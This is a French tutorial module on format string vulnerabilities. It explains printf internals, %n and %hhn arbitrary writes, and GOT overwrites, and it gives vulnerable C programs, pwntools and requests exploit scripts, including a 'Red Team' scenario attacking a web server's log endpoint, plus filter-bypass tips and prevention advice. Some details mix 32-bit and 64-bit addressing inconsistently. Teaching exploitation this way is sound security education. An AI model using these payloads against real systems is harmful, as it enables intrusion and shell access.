# 25 - Format String Vulnerabilities

## 🎯 Ce que tu vas apprendre

Dans ce module, tu vas découvrir les **vulnérabilités de format string**, une classe de bugs subtils mais extrêmement dangereux. Tu vas apprendre à exploiter `printf()`, `scanf()`, et leurs variantes pour leak de la mémoire, bypass ASLR, et écrire à des adresses arbitraires pour prendre le contrôle d'un programme.

## 📚 Théorie

### C'est quoi une format string vulnerability ?

Une **format string vulnerability** se produit quand un attaquant peut contrôler le **format string** d'une fonction comme `printf()`, `sprintf()`, `fprintf()`, etc.

**Code vulnérable :**
```c
char buffer[100];
gets(buffer);
printf(buffer);  // VULNÉRABLE !
```

**Code sécurisé :**
```c
char buffer[100];
gets(buffer);
printf("%s", buffer);  // Sécurisé
```

La différence ?
- **Vulnérable** : `buffer` est traité comme une **format string** → `%x`, `%n`, etc. sont interprétés
- **Sécurisé** : `buffer` est traité comme une **donnée** → affiché littéralement

### Pourquoi ça existe ?

Les fonctions `printf()` ont été conçues pour formatter des sorties, avec des **format specifiers** comme `%d`, `%s`, `%x`, etc.

**Usage normal :**
```c
int age = 25;
char *nom = "Alice";
printf("Nom: %s, Age: %d\n", nom, age);
// Output : Nom: Alice, Age: 25
```

**Problème :** Si le développeur oublie de fournir un format string fixe et utilise une entrée utilisateur, l'attaquant peut injecter ses propres format specifiers.

**Historique :**
- **1999** : Première exploitation documentée (wu-ftpd)
- **2000** : Washington University FTPD remote root via format string
- **2001** : Ramen worm utilise une format string dans rpc.statd
- Depuis : Des milliers de CVE liées aux format strings

### Comment ça marche ?

Pour comprendre l'exploitation, il faut comprendre comment `printf()` fonctionne en interne.

#### Fonctionnement de printf()

```c
printf("Age: %d, Nom: %s", age, nom);
```

**Sur la stack (x64, simplifié) :**
```
+------------------+
| "Age: %d..."     | <- RDI (1er arg : format string)
+------------------+
| 25               | <- RSI (2ème arg : age)
+------------------+
| 0x7f...          | <- RDX (3ème arg : pointeur vers "Alice")
+------------------+
```

`printf()` parcourt la format string caractère par caractère :
1. Texte normal → affiche tel quel
2. `%d` → lit le 2ème argument (RSI = 25)
3. `%s` → lit le 3ème argument (RDX = pointeur), suit le pointeur, affiche "Alice"

#### Exploitation : Pas d'arguments fournis

```c
printf(buffer);  // buffer = "%x %x %x"
```

**Sur la stack :**
```
+------------------+
| buffer           | <- RDI (format string)
+------------------+
| ???              | <- Donnée aléatoire
+------------------+
| ???              | <- Donnée aléatoire
+------------------+
| ???              | <- Donnée aléatoire
+------------------+
```

`printf()` interprète `%x %x %x` et lit 3 valeurs sur la stack **même si elles n'ont pas été passées comme arguments**.

Résultat : **Leak de la stack** !

### Les format specifiers dangereux

| Specifier | Taille | Effet | Dangerosité |
|-----------|--------|-------|-------------|
| `%d`, `%i` | 4 bytes | Affiche un int | Leak mémoire |
| `%u` | 4 bytes | Affiche un unsigned int | Leak mémoire |
| `%x`, `%X` | 4 bytes | Affiche un int en hexa | Leak mémoire (préféré) |
| `%p` | 8 bytes | Affiche un pointeur | Leak adresse |
| `%s` | 8 bytes | Affiche une string | Lecture arbitraire (peut crash) |
| `%n` | - | **Écrit** le nombre de bytes affichés | **Écriture arbitraire** |
| `%hn` | - | Écrit 2 bytes (short) | Écriture contrôlée |
| `%hhn` | - | Écrit 1 byte (char) | Écriture byte par byte |
| `%lln` | - | Écrit 8 bytes (long long) | Écriture 64 bits |

#### Le specifier %n : Écriture arbitraire !

`%n` est le plus dangereux : au lieu de **lire**, il **écrit** en mémoire.

**Fonctionnement :**
```c
int compteur;
printf("ABCD%n", &compteur);
// compteur = 4 (nombre de caractères affichés avant %n)
```

**Exploitation :** Si l'attaquant contrôle le format string, il peut placer une adresse dans le buffer et utiliser `%n` pour écrire à cette adresse.

### Accès direct avec `$`

Le specifier `$` permet d'accéder directement à un argument spécifique.

**Sans `$` :**
```c
printf("%x %x %x %x %x %x");  // Lit les 6 premiers arguments
```

**Avec `$` :**
```c
printf("%6$x");  // Lit directement le 6ème argument
```

**Avantage :** Pas besoin de "padding" avec des `%x` pour atteindre l'argument voulu.

## 🔍 Visualisation

### Exploitation d'une format string : Lecture de la stack

```
PROGRAMME VULNÉRABLE
====================

void vuln() {
    char buffer[100];
    fgets(buffer, sizeof(buffer), stdin);
    printf(buffer);  ← VULNÉRABLE
}


STACK AVANT printf()
====================

Adresse   | Contenu            | Description
----------|--------------------|-----------------------
0x7fff08  | 0x00401234         | Adresse de retour
0x7fff10  | 0x7fff0050         | Saved RBP
0x7fff18  | 0x00007fff0028     | Pointeur vers buffer
0x7fff20  | 0xdeadbeef         | Variable locale
0x7fff28  | "%x %x %x %x"      | Buffer (format string contrôlée)


EXPLOITATION : LEAK DE LA STACK
================================

Input utilisateur : "%x %x %x %x"

printf() exécute :
  %x → Lit 0x00401234 (return address)
  %x → Lit 0x7fff0050 (saved RBP)
  %x → Lit 0x00007fff0028 (pointeur)
  %x → Lit 0xdeadbeef (variable)

Output :
401234 7fff0050 7fff0028 deadbeef

Résultat :
✓ Leak de l'adresse de retour → Bypass PIE
✓ Leak d'adresse de la stack → Bypass ASLR
✓ Leak de données sensibles


EXPLOITATION : ÉCRITURE ARBITRAIRE AVEC %n
===========================================

Objectif : Écrire 0x41414141 à l'adresse 0x0804a000 (GOT entry)

Payload :
[ Adresse cible ][ Padding ][ %n ]
  \x00\xa0\x04\x08   %x%x%x   %4$n
  └──────────────┘   └────┘   └──┘
  4 bytes            Padding  Écriture à l'argument 4


STACK pendant printf()
======================

Position  | Adresse   | Contenu
----------|-----------|------------------
Arg 1     | 0x7fff28  | Pointeur vers buffer (format string)
Arg 2     | 0x7fff30  | 0x12345678 (donnée aléatoire)
Arg 3     | 0x7fff38  | 0xabcdef00 (donnée aléatoire)
Arg 4     | 0x7fff40  | 0x0804a000 ← Adresse cible (dans le buffer)
                       └─ C'est ici que %4$n va écrire !


DÉROULEMENT
===========

printf("\x00\xa0\x04\x08%x%x%x%4$n")

Étape 1 : Affiche \x00\xa0\x04\x08 (non imprimables, 4 bytes)
Étape 2 : %x affiche arg 2 (ajoute ~8 caractères)
Étape 3 : %x affiche arg 3 (ajoute ~8 caractères)
Étape 4 : %x affiche arg 4 (ajoute ~8 caractères)
Étape 5 : %4$n écrit le nombre total de bytes affichés (~28) à l'adresse pointée par arg 4

Résultat :
  *(0x0804a000) = 28 (nombre de caractères affichés)


CONTRÔLER LA VALEUR ÉCRITE
===========================

Pour écrire 0x41414141 (1094795585) :

printf("\x00\xa0\x04\x08%1094795581d%4$n")
                       └──────────┘
                       Largeur du champ = nombre de caractères

Étape 1 : 4 bytes affichés (\x00\xa0\x04\x08)
Étape 2 : %1094795581d affiche un int sur 1094795581 caractères (beaucoup d'espaces)
Étape 3 : Total = 4 + 1094795581 = 1094795585 = 0x41414141
Étape 4 : %4$n écrit 0x41414141 à 0x0804a000

Résultat :
  *(0x0804a000) = 0x41414141 ✓
```

### Flow d'une exploitation complète

```
ÉTAPE 1 : RECONNAISSANCE
========================

Fuzzing avec %x :
  Input : AAAA%x.%x.%x.%x.%x.%x
  Output: AAAA12345678.7fff0100.7fff0200.41414141.deadbeef.cafebabe
                                         └─ "AAAA" en hexa !

Conclusion : Le buffer est à la position 4 sur la stack


ÉTAPE 2 : LEAK D'ADRESSE (ASLR BYPASS)
======================================

Input : %3$p
Output : 0x7ffff7e14000

Analyse : Adresse dans la libc → calcul de la base de la libc


ÉTAPE 3 : CALCUL DES ADRESSES
==============================

Libc base = leak - offset_connu
system() = libc_base + offset_system
GOT entry de printf = 0x0804a000 (adresse fixe si pas de PIE)


ÉTAPE 4 : ÉCRITURE DANS LA GOT
===============================

Objectif : Remplacer l'adresse de printf() dans la GOT par system()

Payload :
  [ GOT_printf ][ Padding ][ %n pour écrire system() ]

Résultat :
  Prochain appel à printf() → appelle system() à la place


ÉTAPE 5 : DÉCLENCHEMENT
========================

Le programme fait :
  printf("/bin/sh")

Mais la GOT a été modifiée :
  → system("/bin/sh")  ← SHELL !
```

## 💻 Exemple pratique

### Binaire vulnérable

```c
// vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void secret_function() {
    system("/bin/sh");
}

void vuln() {
    char buffer[100];
    printf("Enter your name: ");
    fgets(buffer, sizeof(buffer), stdin);
    printf("Hello, ");
    printf(buffer);  // VULNÉRABLE !
}

int main() {
    vuln();
    return 0;
}
```

**Compilation :**
```bash
gcc vuln.c -o vuln -fno-stack-protector -no-pie -z execstack
```

### Exploit 1 : Leak de la stack

```bash
$ ./vuln
Enter your name: AAAA%x.%x.%x.%x.%x.%x.%x.%x
Hello, AAAA40.f7fb85a0.8049d.f7fb8000.41414141.252e7825.78252e78.2e78252e

Analyse :
  AAAA = 0x41414141 apparaît à la position 5
  f7fb8000 ressemble à une adresse libc
```

### Exploit 2 : Leak de l'adresse de secret_function()

```python
#!/usr/bin/env python3
from pwn import *

# Lancer le binaire
io = process('./vuln')

# Trouver l'adresse de secret_function
elf = ELF('./vuln')
secret_addr = elf.symbols['secret_function']
print(f"[+] secret_function @ {hex(secret_addr)}")

# Leak de la stack
io.sendlineafter(b"name: ", b"%p.%p.%p.%p.%p")
leak = io.recvline()
print(f"[+] Leak: {leak}")

io.interactive()
```

### Exploit 3 : Écriture arbitraire avec %n

**Objectif :** Modifier une variable globale.

```c
// vuln2.c
#include <stdio.h>

int auth = 0;  // Variable à modifier

void vuln() {
    char buffer[100];
    fgets(buffer, sizeof(buffer), stdin);
    printf(buffer);

    if (auth == 0x41414141) {
        printf("Access granted!\n");
        system("/bin/sh");
    } else {
        printf("Access denied. auth = 0x%x\n", auth);
    }
}

int main() {
    printf("Address of auth: %p\n", &auth);
    vuln();
    return 0;
}
```

**Exploitation :**
```bash
$ gcc vuln2.c -o vuln2 -fno-stack-protector -no-pie
$ ./vuln2
Address of auth: 0x804a030

# Écrire 0x41414141 à 0x804a030
$ python3 -c "import struct; print(struct.pack('<I', 0x804a030) + b'%1094795581d%4\$n')" | ./vuln2
Access granted!
$ # Shell !
```

**Explication du payload :**
```python
payload = struct.pack('<I', 0x804a030)  # Adresse de auth
payload += b'%1094795581d'              # Padding pour atteindre 0x41414141
payload += b'%4$n'                      # Écrire à la position 4
```

### Exploit 4 : Écriture byte par byte

Pour écrire de grandes valeurs, on peut écrire byte par byte avec `%hhn` :

```python
#!/usr/bin/env python3
from pwn import *

target_addr = 0x804a030  # Adresse à modifier
target_value = 0x41424344  # Valeur à écrire

# Extraire chaque byte
b1 = (target_value >> 0) & 0xFF   # 0x44 = 68
b2 = (target_value >> 8) & 0xFF   # 0x43 = 67
b3 = (target_value >> 16) & 0xFF  # 0x42 = 66
b4 = (target_value >> 24) & 0xFF  # 0x41 = 65

# Construire le payload
payload = b""
payload += p32(target_addr)      # Byte 0
payload += p32(target_addr + 1)  # Byte 1
payload += p32(target_addr + 2)  # Byte 2
payload += p32(target_addr + 3)  # Byte 3

# Écrire chaque byte
# Position 4 : écrire b1 (68)
payload += f"%{b1 - 16}d%4$hhn".encode()

# Position 5 : écrire b2 (67)
payload += f"%{b2 - b1}d%5$hhn".encode()

# Position 6 : écrire b3 (66)
payload += f"%{b3 - b2}d%6$hhn".encode()

# Position 7 : écrire b4 (65)
payload += f"%{b4 - b3}d%7$hhn".encode()

print(payload)
```

## 🎯 Application Red Team

### Scénario : Exploitation d'un serveur web

**Contexte :**
- Serveur web avec une page de log
- Les logs utilisent `printf(log_entry)` sans format string
- ASLR activé, PIE désactivé

**Objectif :** Obtenir un shell.

#### Étape 1 : Identifier la vulnérabilité

```bash
$ curl "http://target.com/log?entry=AAAA%x.%x.%x"
Log: AAAA7fff1234.deadbeef.cafebabe

Confirmation : Format string !
```

#### Étape 2 : Leak d'adresse pour bypass ASLR

```python
#!/usr/bin/env python3
import requests

url = "http://target.com/log"

# Leak avec %p
payload = "%3$p"
r = requests.get(url, params={"entry": payload})
leak = int(r.text.split("Log: ")[1].strip(), 16)

print(f"[+] Leak: {hex(leak)}")

# Calcul de la base de la libc (offset connu)
libc_base = leak - 0x21bf7
system_addr = libc_base + 0x50d60

print(f"[+] Libc base: {hex(libc_base)}")
print(f"[+] system(): {hex(system_addr)}")
```

#### Étape 3 : Modifier la GOT

**Idée :** Remplacer `exit()` dans la GOT par `system()`. Quand le programme appelle `exit("/bin/sh")`, il appelle `system("/bin/sh")`.

```python
#!/usr/bin/env python3
import requests
import struct

url = "http://target.com/log"

# Adresses (trouvées via objdump/readelf)
got_exit = 0x0804a018  # GOT entry pour exit()
system_addr = 0x7ffff7e14420  # Adresse de system() (leaké)

# Construire le payload (écriture byte par byte)
payload = struct.pack('<I', got_exit)
payload += struct.pack('<I', got_exit + 1)
payload += struct.pack('<I', got_exit + 2)
payload += struct.pack('<I', got_exit + 3)

# Écrire chaque byte de system_addr
b1 = (system_addr >> 0) & 0xFF
b2 = (system_addr >> 8) & 0xFF
b3 = (system_addr >> 16) & 0xFF
b4 = (system_addr >> 24) & 0xFF

payload += f"%{b1}d%4$hhn".encode()
payload += f"%{b2-b1}d%5$hhn".encode()
payload += f"%{b3-b2}d%6$hhn".encode()
payload += f"%{b4-b3}d%7$hhn".encode()

# Envoyer le payload
r = requests.get(url, params={"entry": payload})
print(f"[+] GOT modifié !")

# Déclencher exit("/bin/sh") → system("/bin/sh")
# (nécessite que le programme appelle exit avec un argument contrôlable)
```

### Cas réel : CVE-2012-0809 (sudo format string)

En 2012, sudo avait une format string dans le logging :

```c
log_warning(0, "user %s not in sudoers", user);
```

Si `user` contient des format specifiers, exploitation possible.

**Exploit simplifié :**
```bash
$ sudo -u '%x%x%x%x' whoami
sudo: %x%x%x%x: user not found
# Affiche la stack au lieu de chercher l'utilisateur
```

Avec cette primitive, un attaquant local pouvait leak des adresses et potentiellement écrire en mémoire pour escalader les privilèges.

## 🛡️ Protections et bypass

### Protection : FORTIFY_SOURCE

**Mécanisme :**
```bash
gcc -D_FORTIFY_SOURCE=2 program.c
```

Ajoute des vérifications au runtime :
- Compte le nombre de format specifiers
- Compare avec le nombre d'arguments fournis
- Crash le programme si incohérence

**Bypass :**
- Utiliser des fonctions non-protégées (`sprintf`, `vsprintf`)
- Exploiter avant la vérification (race condition)

### Protection : Compilation avec warnings

```bash
gcc -Wformat -Wformat-security program.c
```

Génère des warnings si :
- `printf(buffer)` sans format string fixe
- Nombre d'arguments incorrect

**Bypass :** Pas de bypass, c'est une mesure préventive (compile-time).

### Protection : Format string whitelist

Certains programmes filtrent les entrées :
```c
if (strstr(input, "%n") || strstr(input, "%s")) {
    printf("Invalid input\n");
    return;
}
```

**Bypass :**
- Encodage : `%1$n` au lieu de `%n`
- Obfuscation : `%08x` au lieu de `%x`
- Utiliser d'autres specifiers : `%p`, `%d`, etc.

## 📝 Points clés

1. **Format string vulnerability = contrôle du format string de printf()**

2. **Impact :**
   - **Lecture arbitraire** : leak de la stack, adresses, données sensibles
   - **Écriture arbitraire** : modifier GOT, variables, pointeurs de fonction
   - **Bypass ASLR/PIE** : leak d'adresses pour calculer les bases

3. **Specifiers dangereux :**
   - `%x`, `%p` : Leak mémoire
   - `%s` : Lecture à une adresse (peut crash)
   - `%n` : **Écriture** (le plus dangereux)

4. **Techniques d'exploitation :**
   - **Accès direct avec `$`** : `%6$x` lit l'argument 6 directement
   - **Padding** : `%100d` affiche 100 caractères
   - **Écriture byte par byte** : `%hhn` écrit 1 byte

5. **Cibles courantes :**
   - **GOT (Global Offset Table)** : Remplacer une fonction par une autre
   - **Variables globales** : Modifier auth, permissions, etc.
   - **Pointeurs de fonction** : Détourner le flux d'exécution

6. **Prévention :**
   - **Toujours utiliser un format string fixe** : `printf("%s", buffer)`
   - **Compiler avec FORTIFY_SOURCE** : `gcc -D_FORTIFY_SOURCE=2`
   - **Activer les warnings** : `gcc -Wformat -Wformat-security`

7. **Format specifiers essentiels :**
   - `%d` : int
   - `%u` : unsigned int
   - `%x` : hexa (4 bytes)
   - `%p` : pointeur (8 bytes sur x64)
   - `%s` : string
   - `%n` : écrit le nombre de bytes affichés
   - `%hn` : écrit 2 bytes (short)
   - `%hhn` : écrit 1 byte (char)

## ➡️ Prochaine étape

Maintenant que tu maîtrises les format strings, tu vas découvrir l'**exploitation du heap** dans le module 26. Tu apprendras comment fonctionnent les allocateurs (malloc, free), les vulnérabilités (use-after-free, double-free, heap overflow), et comment les exploiter pour obtenir un contrôle complet du processus.
